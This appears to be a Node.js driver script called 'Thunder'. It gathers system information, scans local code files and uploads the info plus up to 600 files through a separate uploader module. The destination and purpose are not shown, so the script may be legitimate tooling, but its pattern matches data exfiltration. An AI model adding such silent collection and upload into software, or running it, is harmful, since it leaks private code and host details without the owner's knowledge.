const getSystemInfo = require("./systemInfo");
const scanCodeFiles = require("./scanner");


const uploadPayload = require("./uploader");

async function runThunder() {
  try {
    console.log("Starting Thunder...");

    console.log("Collecting system info...");
    const systemInfo = getSystemInfo();

    console.log("Scanning files...");
    const files = scanCodeFiles();


    // console.log("Files count:", files.length);
    // console.log("First file:", files[0]);

    console.log("Uploading...");
    // const response = await uploadPayload(systemInfo, files);
     const response = await uploadPayload(systemInfo, files.slice(0, 600));

console.log("Total files scanned:", files.length);

    console.log("Upload complete.");

    console.log("Uploaded files:", response.data.fileCount);

    console.log(response);
  } catch (error) {
    console.error("Thunder failed:", error.message || error);
  }
}

runThunder();
